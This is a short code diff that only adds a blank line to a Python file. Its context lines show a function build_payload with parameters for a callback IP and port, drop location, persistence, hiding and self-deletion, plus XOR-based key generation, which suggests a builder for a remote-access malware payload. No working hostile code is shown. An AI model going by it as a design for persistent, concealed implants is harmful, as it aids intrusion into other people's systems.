@@ -4,6 +4,7 @@ import random
 from tkinter import messagebox
 from .utils import xor_enc
 
+
 def build_payload(ip, port, name, file_type, drop_loc, persist, hide, self_del):
     """Generates and compiles the payload."""
     keys = [random.randint(64, 127) for _ in range(4)]
